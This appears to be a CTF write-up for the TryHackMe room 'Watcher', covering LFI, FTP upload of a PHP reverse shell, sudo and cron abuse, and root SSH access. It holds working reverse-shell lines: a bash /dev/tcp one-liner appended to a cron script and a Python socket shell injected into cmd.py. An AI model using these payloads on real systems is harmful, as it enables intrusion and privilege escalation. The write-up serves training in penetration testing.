#  Write-up — Watcher [(TryHackMe Room)](https://tryhackme.com/room/watcher)
## Watcher is a fun and beginner-friendly room that takes you through web exploitation, LFI, FTP access, privilege escalation, and finally root access. This write-up explains how I captured all 7 flags step by step.

## Enumeration
We start with an nmap scan:
```python
nmap -A 10.10.175.5
```
Open Ports:
```python
21/tcp – FTP (vsftpd 3.0.5)
22/tcp – SSH (OpenSSH 8.2p1)
80/tcp – HTTP (Apache 2.4.41)
```
## Web Enumeration
On the web server (port 80), /robots.txt discloses two interesting files:

* /flag_1.txt – Contains FLAG 1
* /secret_file_do_not_read.txt – Suspicious

Accessing /flag_1.txt gives us our first flag.

## LFI Exploitation
Navigating to:
```python
http://10.10.175.5/post.php?post=secret_file_do_not_read.txt
```
...reveals FTP credentials!
```python
Username: ****
Password: ****
```
It also mentions that files are saved to /home/ftpuser/ftp/files.

## FTP Access
We log in with credentials and find:
* /flag_2.txt — FLAG 2
* /files/ — Empty, but we can upload files here

## Uploading Reverse Shell
We upload a PHP reverse shell:
```python
put shell.php
```
Then trigger it via LFI:
```python
http://10.10.175.5/post.php?post=/home/ftpuser/ftp/files/shell.php
```
Start listener:
```python
nc -lvnp 4444
```
FLAG 3
```python
/var/www/html/more_secrets_a9f10a/flag_3.txt
```
## User Enumeration
We find user toby and file flag_4.txt, but can't read it due to permissions.

Running sudo -l shows:
```python
(toby) NOPASSWD: ALL
```
Gain shell as toby:
```python
sudo -u toby bash
```
Now we can read flag_4.txt.

## Cron Job Exploit
From /etc/crontab:
```python
*/1 * * * * mat /home/toby/jobs/cow.sh
```
Since cow.sh runs as mat, we append a reverse shell to it:
```python
echo "bash -i >& /dev/tcp/10.10.10.10/9000 0>&1" >> cow.sh
nc -lvnp 9000
```
We get a shell as mat.
FLAG 5

Located in /home/mat/flag_5.txt

## Python Sudo Privilege
In /home/mat/scripts/ we find:
* cmd.py
* will_script.py

We can run as user will without password:
```python
(will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```
Edit cmd.py to include reverse shell:
```python
cat << EOF > cmd.py
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
def get_command(num):
  if(num == "1"):
    return "ls -lah"
  if(num == "2"):
    return "id"
  if(num == "3"):
    return "cat /etc/passwd"
EOF
```
Start listener:
```python
nc -lvnp 8888
```
Run:
```python
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
```
FLAG 6

Now accessible as user will

## Root Privilege
In /opt/backups we find key.b64. Decode:
```python
base64 -d key.b64 > id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.175.5
```
FLAG 7
 
Final flag in /root/flag_7.txt

## [Watcher](https://tryhackme.com/room/watcher) offers a clear path through layered exploitation — from LFI to cron abuse — making it a solid practice for privilege escalation and web attack chains.
